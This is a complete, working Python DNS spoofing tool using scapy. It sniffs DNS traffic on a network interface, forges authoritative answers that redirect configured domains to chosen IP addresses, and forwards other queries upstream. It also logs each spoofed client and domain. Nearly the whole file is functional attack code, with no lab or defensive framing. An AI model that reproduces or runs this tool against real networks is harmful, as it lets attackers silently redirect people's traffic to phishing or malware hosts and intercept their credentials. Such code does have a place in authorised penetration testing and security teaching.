#!/usr/bin/env python3
"""
DNS Spoofing Tool
Intercepts DNS queries and responds with spoofed answers for targeted domains
"""

import argparse
import sys
import json
import threading
import signal
import os
from datetime import datetime
from colorama import init, Fore, Style
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

init(autoreset=True)

class DNSSpoofer:
    def __init__(self, interface, config_file, verbose=False):
        self.interface = interface
        self.config_file = config_file
        self.verbose = verbose
        self.running = False
        self.targets = {}
        self.stats = {
            'queries_intercepted': 0,
            'queries_spoofed': 0,
            'queries_forwarded': 0,
            'spoofed_domains': [],
            'start_time': None
        }
        
    def load_config(self):
        """Load DNS spoofing configuration"""
        try:
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            self.targets = config.get('targets', {})
            self.forward_unmatched = config.get('forward_unmatched', True)
            self.upstream_dns = config.get('upstream_dns', '8.8.8.8')
            
            print(f"{Fore.GREEN}[+] Loaded {len(self.targets)} target domains{Style.RESET_ALL}")
            if self.verbose:
                for domain, ip in self.targets.items():
                    print(f"  {domain} -> {ip}")
                    
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Config file not found: {self.config_file}{Style.RESET_ALL}")
            sys.exit(1)
        except json.JSONDecodeError as e:
            print(f"{Fore.RED}[-] Invalid JSON in config file: {e}{Style.RESET_ALL}")
            sys.exit(1)
    
    def create_spoofed_response(self, original_packet, spoofed_ip):
        """Create a spoofed DNS response"""
        # Extract original query
        query_name = original_packet[DNSQR].qname
        query_type = original_packet[DNSQR].qtype
        query_id = original_packet[DNS].id
        
        # Create spoofed response
        spoofed_response = IP(
            dst=original_packet[IP].src,
            src=original_packet[IP].dst
        ) / UDP(
            dport=original_packet[UDP].sport,
            sport=original_packet[UDP].dport
        ) / DNS(
            id=query_id,
            qr=1,  # Response
            aa=1,  # Authoritative answer
            qd=original_packet[DNS].qd,  # Original question
            an=DNSRR(
                rrname=query_name,
                type=query_type,
                rdata=spoofed_ip,
                ttl=300
            )
        )
        
        return spoofed_response
    
    def forward_dns_query(self, original_packet):
        """Forward DNS query to upstream server"""
        try:
            # Extract original query
            query_name = original_packet[DNSQR].qname.decode().rstrip('.')
            
            # Create new query to upstream DNS
            upstream_query = IP(dst=self.upstream_dns) / UDP(dport=53) / DNS(
                id=original_packet[DNS].id,
                qd=original_packet[DNS].qd
            )
            
            # Send query and wait for response
            response = sr1(upstream_query, timeout=5, verbose=False)
            
            if response and DNS in response:
                # Modify response to send back to original client
                forwarded_response = IP(
                    dst=original_packet[IP].src,
                    src=original_packet[IP].dst
                ) / UDP(
                    dport=original_packet[UDP].sport,
                    sport=original_packet[UDP].dport
                ) / DNS(
                    id=original_packet[DNS].id,
                    qr=response[DNS].qr,
                    aa=response[DNS].aa,
                    tc=response[DNS].tc,
                    rd=response[DNS].rd,
                    ra=response[DNS].ra,
                    rcode=response[DNS].rcode,
                    qd=response[DNS].qd,
                    an=response[DNS].an,
                    ns=response[DNS].ns,
                    ar=response[DNS].ar
                )
                
                send(forwarded_response, verbose=False)
                self.stats['queries_forwarded'] += 1
                
                if self.verbose:
                    print(f"{Fore.BLUE}[FORWARD] {query_name} -> upstream DNS{Style.RESET_ALL}")
                    
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[FORWARD ERROR] {e}{Style.RESET_ALL}")
    
    def dns_handler(self, packet):
        """Handle DNS packets"""
        if not self.running:
            return
            
        # Check if it's a DNS query
        if DNS in packet and packet[DNS].qr == 0 and DNSQR in packet:
            self.stats['queries_intercepted'] += 1
            
            try:
                query_name = packet[DNSQR].qname.decode().rstrip('.')
                query_type = packet[DNSQR].qtype
                src_ip = packet[IP].src
                
                if self.verbose:
                    print(f"{Fore.CYAN}[QUERY] {query_name} from {src_ip}{Style.RESET_ALL}")
                
                # Check if domain should be spoofed
                spoofed = False
                for target_domain, spoofed_ip in self.targets.items():
                    if query_name.endswith(target_domain) or query_name == target_domain:
                        # Create and send spoofed response
                        spoofed_response = self.create_spoofed_response(packet, spoofed_ip)
                        send(spoofed_response, verbose=False)
                        
                        self.stats['queries_spoofed'] += 1
                        self.stats['spoofed_domains'].append({
                            'timestamp': datetime.now().isoformat(),
                            'domain': query_name,
                            'spoofed_ip': spoofed_ip,
                            'client_ip': src_ip
                        })
                        
                        print(f"{Fore.RED}[SPOOFED] {query_name} -> {spoofed_ip} (client: {src_ip}){Style.RESET_ALL}")
                        spoofed = True
                        break
                
                # Forward query if not spoofed and forwarding is enabled
                if not spoofed and self.forward_unmatched:
                    threading.Thread(target=self.forward_dns_query, args=(packet,), daemon=True).start()
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[DNS ERROR] {e}{Style.RESET_ALL}")
    
    def start_spoofing(self):
        """Start DNS spoofing"""
        print(f"{Fore.CYAN}[*] Starting DNS spoofing on {self.interface}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Monitoring DNS queries on port 53{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        self.stats['start_time'] = datetime.now()
        self.running = True
        
        try:
            # Sniff DNS traffic
            sniff(iface=self.interface, filter="udp port 53", prn=self.dns_handler, store=False)
        except Exception as e:
            print(f"{Fore.RED}[-] Error during DNS spoofing: {e}{Style.RESET_ALL}")
        finally:
            self.running = False
    
    def save_logs(self):
        """Save spoofing logs"""
        log_file = f"dns_spoof_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        log_data = {
            'statistics': self.stats,
            'configuration': {
                'targets': self.targets,
                'forward_unmatched': self.forward_unmatched,
                'upstream_dns': self.upstream_dns
            }
        }
        
        try:
            with open(log_file, 'w') as f:
                json.dump(log_data, f, indent=2)
            print(f"{Fore.GREEN}[+] Logs saved to {log_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving logs: {e}{Style.RESET_ALL}")
    
    def print_statistics(self):
        """Print spoofing statistics"""
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}DNS SPOOFING STATISTICS")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}Queries Intercepted: {self.stats['queries_intercepted']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Queries Spoofed: {self.stats['queries_spoofed']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Queries Forwarded: {self.stats['queries_forwarded']}{Style.RESET_ALL}")
        
        if self.stats['start_time']:
            duration = (datetime.now() - self.stats['start_time']).total_seconds()
            print(f"{Fore.YELLOW}Runtime: {duration:.2f} seconds{Style.RESET_ALL}")
        
        if self.stats['spoofed_domains']:
            print(f"\n{Fore.CYAN}Spoofed Domains:{Style.RESET_ALL}")
            for entry in self.stats['spoofed_domains'][-10:]:  # Show last 10
                print(f"  {entry['timestamp']}: {entry['domain']} -> {entry['spoofed_ip']} (client: {entry['client_ip']})")
    
    def run(self):
        """Main execution function"""
        print(f"{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}DNS SPOOFING TOOL")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        # Check if running as root
        if os.geteuid() != 0:
            print(f"{Fore.RED}[-] This script must be run as root (use sudo){Style.RESET_ALL}")
            sys.exit(1)
        
        # Load configuration
        self.load_config()
        
        # Set up signal handler for graceful exit
        def signal_handler(sig, frame):
            print(f"\n{Fore.YELLOW}[!] Interrupt received, stopping DNS spoofing...{Style.RESET_ALL}")
            self.running = False
            
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start spoofing
        try:
            self.start_spoofing()
        except KeyboardInterrupt:
            self.running = False
        finally:
            # Save logs and print statistics
            self.save_logs()
            self.print_statistics()

def main():
    parser = argparse.ArgumentParser(description='DNS Spoofing Tool')
    parser.add_argument('-i', '--interface', required=True, help='Network interface')
    parser.add_argument('-c', '--config', required=True, help='Configuration file (JSON)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create and run spoofer
    spoofer = DNSSpoofer(args.interface, args.config, args.verbose)
    spoofer.run()

if __name__ == '__main__':
    main()
